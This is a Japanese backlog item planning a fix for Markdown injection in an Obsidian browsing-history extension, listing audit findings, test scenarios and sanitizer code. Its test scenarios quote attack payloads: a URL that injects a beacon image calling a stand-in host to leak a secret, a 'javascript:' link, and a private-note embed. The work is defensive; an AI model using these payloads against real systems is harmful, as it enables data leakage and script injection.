# PBI: Obsidianマークダウン注入の根本修正（共有サニタイザ + 主要2入口点）

## ユーザーストーリー
拡張機能の利用者として、閲覧したページのタイトル・URLがどれほど悪意ある内容であっても、自分のObsidian Vaultの日次ノートに意図しないMarkdownリンクや埋め込み（`![[...]]`）が混入しないことを望む。なぜなら、自分の閲覧履歴ノートは信頼できる記録として扱いたく、悪意あるページを見ただけで発信元不明のビーコン画像や機密ノートの意図しない展開が起きるのは容認できないためである。

## ビジネス価値
- **セキュリティ**: VulnHunter監査（2026-07-21）で確認された CWE-79（Markdown注入）を、自動記録（VALID_VISIT）と手動記録（MANUAL_RECORD/PREVIEW_RECORD/SAVE_RECORD）という最も頻度の高い2つの入口点で解消する。
- **信頼性**: 「閲覧履歴ノートは常に安全」という利用者の暗黙の信頼を裏切らない。
- **再利用性**: 修正対象の `sanitizeForObsidian()` は他の書き込み経路（obsidianFormatter.ts, dashboard.ts — 本PBIの後続PBI Bで対応）からも利用される共有ヘルパーであり、ここで直すことが後続PBIの前提になる。

## 対象Finding（VulnHunter監査結果より）
監査結果一式: `obsidian-smart-history_VULNHUNT_RESULTS_2026-07-21-000000/README.md`

| VULN | CWE | Severity | 説明 | PoC | Exploit Test |
|---|---|---|---|---|---|
| VULN-002 | CWE-79 | Medium | `markdownSanitizer.ts`のサニタイザがhttp(s)スキームのみ対象、Obsidianの`[[wikilink]]`/`![[embed]]`構文を一切扱わない | `poc/VULN-002_sanitizer_scheme_scope_mismatch.md` | `exploit_tests/test_vuln_002_sanitizer_scope_mismatch.test.ts` |
| VULN-005 | CWE-79 | Low | VULN-002と同一欠陥、MANUAL_RECORD/SAVE_RECORD経由 | `poc/VULN-005_manual_record_sanitizer_scope_mismatch.md` | `exploit_tests/test_vuln_005_manual_record_sanitizer_scope.test.ts` |
| VULN-001 | CWE-79 | Medium | `formatMarkdownStep.ts`で`url`が`sanitizeForObsidian()`を一切通らず生のまま`[title](url)`に埋め込まれる | `poc/VULN-001_valid_visit_url_markdown_injection.md` | `exploit_tests/test_vuln_001_valid_visit_url_injection.test.ts` |
| VULN-004 | CWE-79 | Medium | VULN-001と同一欠陥、MANUAL_RECORD/PREVIEW_RECORD/SAVE_RECORD経由。`SAVE_RECORD`は`isSecureUrl()`スキームチェックすら無い | `poc/VULN-004_manual_record_url_markdown_injection.md` | `exploit_tests/test_vuln_004_manual_record_url_injection.test.ts` |

## BDD受け入れシナリオ

```gherkin
Scenario: 悪意あるURLがObsidianノートのMarkdownリンク境界を破壊できない（VULN-001/004）
  Given 攻撃者が "https://evil.tld/x)%20![beacon](https://evil.tld/exfil.png?leak=SECRET" というURLでページをホストしている
  And 利用者が自動記録機能（またはポップアップの手動記録）でこのページを記録した
  When formatMarkdownStep がタイトル・URL・サマリーからMarkdown文字列を生成する
  Then 生成された文字列には "](" を単独で閉じる未エスケープの丸括弧・角括弧が含まれない
  And 攻撃者が挿入しようとした "![beacon](...)" という独立したMarkdownノードが生成されない

Scenario: http(s)以外のスキームやwikilink構文を含むタイトルがエスケープされる（VULN-002/005）
  Given 攻撃者が制御するページの document.title が "Click [here](javascript:alert(document.domain)) or ![[Private Note]]" である
  And 利用者がこのページを自動記録または手動記録した
  When sanitizeForObsidian がタイトルを処理する
  Then "[here](javascript:...)" のリンド構造がエスケープされ、生きたMarkdownリンクとして解釈されない
  And "![[Private Note]]" もエスケープされ、Obsidian側でVault内の任意ノートを埋め込む効果を持たない

Scenario: 正常なタイトル・URL・サマリーはこれまで通り記録される（回帰防止）
  Given 利用者が特殊文字を含まない通常のページ（例: "https://example.com/article" というタイトル "普通の記事"）を記録した
  When formatMarkdownStep と sanitizeForObsidian が処理する
  Then 生成されたMarkdownは "- HH:MM [普通の記事](https://example.com/article)" の形式のまま変化しない
```

## 受け入れ基準
- [ ] `src/utils/markdownSanitizer.ts` の `sanitizeForObsidian()` が、http(s)以外のスキーム（`javascript:`, `data:` 等）を含む `[text](url)` 構造もエスケープする（`sanitizeAllMarkdownLinks` への切り替え、または同等の scheme-agnostic 実装）
- [ ] `sanitizeForObsidian()` が Obsidian の `[[wikilink]]` / `![[embed]]` 構文もエスケープする新規ロジックを持つ
- [ ] `src/background/pipeline/steps/formatMarkdownStep.ts` の `url` が、`[${sanitizedTitle}](${url})` に埋め込まれる前に URL 安全な形でサニタイズ（`)`/`(`/`[`/`]`/`!` の除去またはURLエンコード）される
- [ ] `SAVE_RECORD` ハンドラ（`src/background/handlers/messageHandlers.ts`）で `url` を扱う経路が、`MANUAL_RECORD` と同等以上の検証を通る
- [ ] 既存の `markdownSanitizer.test.ts` の全テスト（http(s)リンクエスケープ等）が変更後も引き続きパスする
- [ ] VULN-001/002/004/005 の4件のexploit testファイル（`exploit_tests/test_vuln_00{1,2,4,5}_*.test.ts`）が、実プロジェクトへコピー・実行した際にPASSすることを確認する（内容は静的トレースとして書かれているため、実プロジェクトの実装に合わせて調整が必要な場合がある）

## テスト戦略（t_wadaスタイル）

### E2Eテスト
- [ ] （任意・低優先）Playwrightで悪意あるページを記録 → ダッシュボード履歴パネルでMarkdownソースを確認するシナリオ。既存のE2E基盤（`docs/blog-5_0/video-v5-features/`等）を参考に、必須ではない

### 統合テスト
- [ ] `src/background/pipeline/__tests__/` 配下、`RecordingPipeline` を通した VALID_VISIT / MANUAL_RECORD 双方の経路で、悪意あるタイトル・URLが最終的な保存Markdownに漏れないことを検証する統合テスト

### 単体テスト
- [ ] `src/utils/__tests__/markdownSanitizer.test.ts` に、scheme-agnostic化・wikilink エスケープの新規テストケースを追加（VULN-002/005 の PoC ペイロードをそのまま使用）
- [ ] `src/background/pipeline/steps/__tests__/formatMarkdownStep.test.ts` に、`url` 経由のリンク境界破壊（VULN-001/004 の PoC ペイロード）を防ぐ境界値テストを追加

## 実装アプローチ
- **Outside-In**: 既存の `exploit_tests/test_vuln_00{1,2,4,5}_*.test.ts` をまず実プロジェクトの `__tests__/` 配下相当にコピー/参考にし、失敗を確認してから実装する
- **Red-Green-Refactor**: 各VULNごとに RED（脆弱性を再現するテストが失敗）→ 実装 → GREEN のサイクルを回す
- **修正順序を厳守**: VULN-002/005（共有ヘルパー `markdownSanitizer.ts`）を先に直し、その後 VULN-001/004（`formatMarkdownStep.ts` が `url` をサニタイズ経路に通す）を直す。逆順だと `formatMarkdownStep.ts` が呼び出すサニタイザがまだ不完全な状態でテストを書くことになり手戻りが発生する

## 見積もり
5pt（対象ファイルは2つだが、共有ヘルパーの後方互換確認・4件分のテスト整備・既存テストの回帰確認を含むため中規模）

## 技術的考慮事項
- 依存関係: `sanitizeForObsidian()` は `obsidianFormatter.ts` / `dashboard.ts`（本クラスタの後続PBI B）からも呼ばれる。ここでの修正が正しければPBI Bの一部（VULN-007/020）はより小さな差分で済む可能性がある
- テスタビリティ: `sanitizeMarkdownLinks` / `sanitizeAllMarkdownLinks` は既に純粋関数として存在するため、単体テストが容易
- 非機能要件: 正規表現ベースのサニタイズであり、CWE分類上は「MITIGATION」相当（構造的な拒否ではなくエスケープ）。将来的な強化として、URLを丸括弧内に置かない出力形式への変更も検討可（`src/utils/markdownFormatter.ts`のプレーンテキスト形式`- URL: ${url}`が参考になる）

## 実装者向け注記

### 現状コードの確認
（着手前に必ず実行すること — 2026-07-21監査時点で以下の行番号が該当することを確認済み）
```bash
grep -n "sanitizeMarkdownLinks\|sanitizeAllMarkdownLinks\|sanitizeForObsidian" src/utils/markdownSanitizer.ts
grep -n "const { url, title } = data\|sanitizedTitle.*url" src/background/pipeline/steps/formatMarkdownStep.ts
```

### 実装手順
1. `src/utils/markdownSanitizer.ts` に Obsidian wikilink/embed エスケープ関数（例: `escapeObsidianWikilinks`）を追加する
   ```ts
   export function escapeObsidianWikilinks(text: string): string {
       if (!text || typeof text !== 'string') return text;
       return text.replace(/(!?)\[\[([^\]]*)\]\]/g, (_m, bang, inner) => `${bang}\\[\\[${inner}\\]\\]`);
   }
   ```
2. `sanitizeForObsidian()` の実装を、`sanitizeMarkdownLinks`（http(s)限定）から `sanitizeAllMarkdownLinks`（スキーム非依存、既存だが未使用）の呼び出しに切り替え、続けて `escapeObsidianWikilinks` を適用する
3. `formatMarkdownStep.ts` で `url` にもURL安全なサニタイズ（例: `)`, `(`, `[`, `]`, `!` を含む場合はパーセントエンコード、または `sanitizeForObsidian` 相当をURLターゲット用に適用）を追加してから `` `[${sanitizedTitle}](${url})` `` に埋め込む
4. `src/background/handlers/messageHandlers.ts` の `SAVE_RECORD` ハンドラに、`MANUAL_RECORD` 同様の `isSecureUrl()` チェックを追加する（VULN-004のPoCが指摘する欠落分）

### 落とし穴
- `sanitizeMarkdownLinks`（http(s)限定版）を直接書き換えると、既存テスト「should not escape relative URL patterns」「should not escape non-URL patterns」が意図的に「エスケープしない」ことを検証しているため壊れる。**関数自体は変更せず、`sanitizeForObsidian` の呼び出し先を `sanitizeAllMarkdownLinks` に切り替える**方が非破壊的
- `url` のサニタイズをURLエンコードで行うと、正当なURL（クエリパラメータに`&`や日本語を含むもの等）の可読性・クリック可能性が損なわれる可能性がある。丸括弧・角括弧・感嘆符など「Markdownリンク構文にとって危険な文字」のみを対象にすること

## Definition of Done
- [ ] 全BDDシナリオが自動テストとして実装されパスする
- [ ] `exploit_tests/test_vuln_001_valid_visit_url_injection.test.ts`, `test_vuln_002_sanitizer_scope_mismatch.test.ts`, `test_vuln_004_manual_record_url_injection.test.ts`, `test_vuln_005_manual_record_sanitizer_scope.test.ts` の内容に基づく回帰テストがプロジェクトに追加されPASSする
- [ ] `npm run type-check` と `npm test` が全てパスする
- [ ] コードレビュー完了
- [ ] `pbi/00-INDEX.md` を更新し、本PBIをアーカイブ対象として記録する
